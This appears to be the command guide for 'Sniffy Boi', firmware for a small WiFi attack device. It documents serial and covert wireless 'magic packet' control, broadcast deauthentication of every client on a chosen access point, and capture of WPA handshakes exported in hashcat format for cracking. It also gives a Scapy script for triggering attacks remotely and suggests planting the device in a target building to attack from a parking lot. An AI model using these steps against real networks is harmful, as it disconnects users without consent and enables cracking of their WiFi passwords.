# Sniffy Boi - Dual Command Interface Guide

## 🎯 Two Ways to Control Sniffy Boi

### 1. Serial CLI (USB Cable)
Type commands directly in serial monitor

### 2. Wireless C2 (Magic Packets)
Send WiFi probe requests with special SSIDs from any device!

---

## 🖥️ Serial Command Interface

### Setup
```bash
# Flash firmware
~/.platformio/penv/bin/platformio run --target upload

# Open serial monitor
~/.platformio/penv/bin/platformio device monitor --baud 115200
```

### You'll see:
```
╔════════════════════════════════════════════════════════════╗
║              COMMAND INTERFACE READY                     ║
╚════════════════════════════════════════════════════════════╝

  Serial CLI:    Type 'help' for commands
  Wireless C2:   Send probe with SSID 'SNIFFY:<CMD>'

════════════════════════════════════════════════════════════

sniffy>
```

### Available Commands

#### Discovery
```
sniffy> scan
# Lists all discovered APs with:
# - Index number
# - MAC address
# - SSID
# - Channel
# - Encryption type (OPEN/WEP/WPA/WPA2/WPA3)
# - Signal strength (RSSI)

sniffy> status
# Shows system statistics:
# - Uptime
# - Free memory
# - Total packets captured
# - Beacons, probes, data frames
# - Deauth count
# - Handshakes captured
# - Devices discovered
```

#### Attacks
```
sniffy> attack AABBCCDDEEFF
# Deauth attack on specific AP
# - Sends broadcast deauth (disconnects ALL clients)
# - 5-packet burst
# - Automatically monitors for handshake capture

sniffy> pmkid 001122334455
# Clientless PMKID attack
# (Not yet implemented - placeholder)
```

#### Data Export
```
sniffy> export
# Prints all captured handshakes in hashcat mode 22000 format
# Ready to paste into hashcat for cracking!
```

#### Channel Control
```
sniffy> channel 6
# Lock to channel 6 (disables hopping)

sniffy> hopping on
# Enable channel hopping (scans all 13 channels)

sniffy> hopping off
# Disable channel hopping
```

#### Help
```
sniffy> help
# Shows full command reference
```

---

## 📡 Wireless Command & Control (Magic Packets)

### The Genius Part

Control Sniffy Boi **wirelessly** from your phone or laptop by sending WiFi probe requests with special SSIDs!

**How it works:**
1. Sniffy Boi captures ALL WiFi packets (promiscuous mode)
2. Detects probe requests with SSID starting with `SNIFFY:`
3. Parses SSID as command
4. Executes command
5. Prints result to serial

**No special app needed - works with built-in WiFi!**

---

### Command Format

```
SSID: SNIFFY:<COMMAND>:<PARAMS>
```

**Examples:**

#### Scan for APs
```
SNIFFY:SCAN
```

#### Attack specific MAC
```
SNIFFY:ATTACK:AABBCCDDEEFF
```

#### Get status
```
SNIFFY:STATUS
```

#### Lock channel
```
SNIFFY:CHANNEL:6
```

#### Enable hopping
```
SNIFFY:HOPPING:ON
```

#### Export hashes
```
SNIFFY:EXPORT
```

---

### How to Send Wireless Commands

#### From Linux/Mac (NetworkManager)
```bash
# Try to "connect" to magic SSID (will fail, but probe is sent)
nmcli dev wifi connect "SNIFFY:SCAN"

# Or create temporary connection
nmcli connection add type wifi ifname wlan0 con-name sniffy-scan \
  ssid "SNIFFY:SCAN"
nmcli connection up sniffy-scan

# Attack command
nmcli dev wifi connect "SNIFFY:ATTACK:AABBCCDDEEFF"
```

#### From Android
1. **Settings** → **WiFi**
2. **Add Network** (or **+** button)
3. Network name: `SNIFFY:SCAN`
4. Security: **None**
5. Tap **Save** (sends probe request immediately!)

Your phone will send a probe request with that SSID, Sniffy Boi will capture it and execute the command!

#### From iPhone/iOS
1. **Settings** → **WiFi**
2. **Other...** (at bottom of network list)
3. Name: `SNIFFY:SCAN`
4. Security: **None**
5. Tap **Join**

#### From Windows (Command Prompt as Admin)
```cmd
netsh wlan connect ssid="SNIFFY:SCAN" name="sniffy-cmd"
```

#### Using Scapy (Python - Advanced)
```python
from scapy.all import *

# Send probe request with magic SSID
probe = RadioTap() \
      / Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
              addr2="aa:bb:cc:dd:ee:ff", addr3="ff:ff:ff:ff:ff:ff") \
      / Dot11ProbeReq() \
      / Dot11Elt(ID="SSID", info="SNIFFY:ATTACK:112233445566")

sendp(probe, iface="wlan0mon", count=3)
```

---

## 📊 Example Session

### Serial Console Output:

```
sniffy> help
╔════════════════════════════════════════════════════════════╗
║                  COMMAND REFERENCE                       ║
╚════════════════════════════════════════════════════════════╝
...

sniffy> scan
╔════════════════════════════════════════════════════════════╗
║                  DISCOVERED ACCESS POINTS                ║
╚════════════════════════════════════════════════════════════╝

  [0] AA:BB:CC:DD:EE:FF | HomeNetwork | Ch:6 | WPA2 | -45 dBm
  [1] 11:22:33:44:55:66 | GuestWiFi   | Ch:11 | WPA2 | -62 dBm
  [2] 99:88:77:66:55:44 | OpenNet     | Ch:1 | OPEN | -70 dBm

  Total APs: 3
════════════════════════════════════════════════════════════

sniffy> attack AABBCCDDEEFF
╔════════════════════════════════════════════════════════════╗
║            🎯 DEAUTH ATTACK INITIATED                    ║
╚════════════════════════════════════════════════════════════╝
  Target AP: AA:BB:CC:DD:EE:FF
  Mode:      Broadcast (all clients)
  Burst:     5 packets
════════════════════════════════════════════════════════════
✓ Deauth sent. Monitor for handshake capture...

# ... wait 5-10 seconds ...

[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M1]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M2]

╔════════════════════════════════════════════════════════════╗
║          ★★★ COMPLETE HANDSHAKE CAPTURED! ★★★            ║
╚════════════════════════════════════════════════════════════╝
  SSID:     HomeNetwork
  AP:       AA:BB:CC:DD:EE:FF
  Client:   11:22:33:44:55:66
  ...

sniffy> export
╔════════════════════════════════════════════════════════════╗
║              HASHCAT EXPORT (MODE 22000)                 ║
╚════════════════════════════════════════════════════════════╝

[0] HomeNetwork
    WPA*02*AABBCCDDEEFF*112233445566*486F6D654E6574776F726B*...

  Total handshakes: 1
════════════════════════════════════════════════════════════

sniffy>
```

### Wireless C2 Session:

**On your phone:** Add WiFi network with SSID `SNIFFY:SCAN`

**On Sniffy Boi serial:**
```
╔════════════════════════════════════════════════════════════╗
║          🎯 WIRELESS COMMAND RECEIVED                    ║
╚════════════════════════════════════════════════════════════╝
  SSID:   SNIFFY:SCAN
  From:   AA:BB:CC:DD:EE:FF
════════════════════════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                  DISCOVERED ACCESS POINTS                ║
╚════════════════════════════════════════════════════════════╝
  [0] AA:BB:CC:DD:EE:FF | HomeNetwork | Ch:6 | WPA2 | -45 dBm
  ...
```

**Your device sent the command, Sniffy Boi executed it!**

---

## 🎯 Use Cases

### Wardriving from Car
1. Mount Sniffy Boi in dashboard
2. Power via USB
3. **No laptop needed!**
4. Control from phone using wireless commands
5. `SNIFFY:STATUS` to check capture counts
6. `SNIFFY:EXPORT` when done (connect laptop to serial)

### Penetration Testing
1. Place Sniffy Boi in target building
2. Walk away
3. From outside, send wireless commands to attack APs
4. `SNIFFY:ATTACK:TARGETMAC` from parking lot
5. Retrieve device later, export via serial

### CTF Competitions
1. Fast command execution via serial
2. Wireless C2 for remote challenges
3. `scan` → identify targets
4. `attack` → capture handshakes
5. `export` → crack passwords

---

## 🔒 Security Considerations

### Magic Packet Detection
**Anyone can send commands to your Sniffy Boi!**

The magic prefix `SNIFFY:` prevents accidental triggers, but intentional commands will execute.

**Mitigations:**
1. **Change magic prefix** - Edit `MAGIC_PREFIX` in `CommandInterface.cpp`
2. **MAC whitelist** - Only accept commands from specific MACs (future feature)
3. **Authentication** - Add password in SSID like `SNIFFY:PASSWORD:CMD` (future)
4. **Physical access** - Keep device secure

**Current implementation:** No authentication - this is for authorized testing only!

---

## 🚀 Next Steps

1. Flash firmware
2. Open serial monitor
3. Type `help` to see commands
4. Try `scan` to discover APs
5. Send wireless command from phone: `SNIFFY:STATUS`
6. Watch Sniffy Boi execute it!

**Ready to hack? Sniffy Boi is waiting for your commands!** 🎯
